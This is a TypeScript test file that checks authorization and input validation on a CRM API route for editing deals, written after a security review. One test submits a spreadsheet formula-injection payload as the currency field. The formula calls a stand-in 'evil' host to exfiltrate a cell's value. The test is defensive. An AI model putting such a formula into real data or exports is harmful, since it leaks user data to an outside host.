import { beforeEach, describe, expect, it, vi } from 'vitest'

/**
 * Security review findings (M1, M2) on PATCH /api/deals/[id]:
 *  - Any agent could edit any deal in the account. With deals now crediting
 *    revenue to whoever closed them, an agent could reopen a colleague's won
 *    deal and win it again to move the money into their own report, or take
 *    the deal with assigned_to = themselves.
 *  - currency and value were written as sent, so "=HYPERLINK(...)" as a
 *    currency reached the owner's Excel download, and a negative value was
 *    accepted.
 * An agent works their own deals and unassigned ones, like leads.
 */

const h = vi.hoisted(() => ({
  role: 'agent',
  existing: {} as Record<string, unknown>,
  updates: [] as Record<string, unknown>[],
}))

vi.mock('@/lib/auth/account', () => ({
  requireRoleOrApiKey: () => Promise.resolve({ accountId: 'acc', userId: 'me', role: h.role }),
  toErrorResponse: (err: unknown) => {
    throw err
  },
}))
vi.mock('@/lib/audit', () => ({ audit: () => Promise.resolve(), auditCtx: () => ({}) }))
vi.mock('@/lib/meta-ads/triggers', () => ({ reportMetaAdsOutcome: () => Promise.resolve() }))
vi.mock('@/lib/leads/owned-refs', () => ({ checkOwnedRefs: () => Promise.resolve(null) }))
vi.mock('@/lib/db', () => ({
  prisma: {
    deal: {
      findFirst: () => Promise.resolve({ ...h.existing }),
      update: (a: { data: Record<string, unknown> }) => {
        h.updates.push(a.data)
        const set = Object.fromEntries(Object.entries(a.data).filter(([, v]) => v !== undefined))
        return Promise.resolve({ ...h.existing, ...set })
      },
    },
    pipelineStage: { findFirst: () => Promise.resolve({ stage_type: 'open' }) },
    dealStageEvent: { create: () => Promise.resolve({}) },
  },
}))

import { PATCH } from './route'

const patch = (body: Record<string, unknown>) =>
  PATCH(new Request('http://x', { method: 'PATCH', body: JSON.stringify(body) }) as never, { params: Promise.resolve({ id: 'd1' }) })

const deal = (over: Record<string, unknown> = {}) => ({ id: 'd1', account_id: 'acc', pipeline_id: 'p1', stage_id: 's1', status: 'open', value: 1000, assigned_to: null, ...over })

describe('PATCH /api/deals/[id]: whose deal, and what may be written', () => {
  beforeEach(() => {
    h.updates = []
    h.role = 'agent'
    h.existing = deal()
  })

  it("an agent cannot change a colleague's deal", async () => {
    h.existing = deal({ assigned_to: 'colleague', status: 'won' })
    expect((await patch({ stage_id: 's1' })).status).toBe(403)
    expect(h.updates).toHaveLength(0)
  })

  it('an agent cannot hand a deal to somebody else, but may take an unassigned one', async () => {
    expect((await patch({ assigned_to: 'colleague' })).status).toBe(403)
    expect((await patch({ assigned_to: 'me' })).status).toBe(200)
  })

  it('a supervisor may change anybody’s deal', async () => {
    h.role = 'supervisor'
    h.existing = deal({ assigned_to: 'colleague' })
    expect((await patch({ title: 'Knee replacement' })).status).toBe(200)
  })

  it('refuses a currency that is not a three-letter code', async () => {
    expect((await patch({ currency: '=HYPERLINK("https://evil/?"&A2,"Open")' })).status).toBe(400)
    expect((await patch({ currency: { x: 1 } })).status).toBe(400)
    expect(h.updates).toHaveLength(0)
    expect((await patch({ currency: 'inr' })).status).toBe(200)
    expect(h.updates[0]).toMatchObject({ currency: 'INR' })
  })

  it('refuses a negative or non-numeric amount', async () => {
    expect((await patch({ value: -5 })).status).toBe(400)
    expect((await patch({ value: 'lots' })).status).toBe(400)
    expect(h.updates).toHaveLength(0)
  })
})
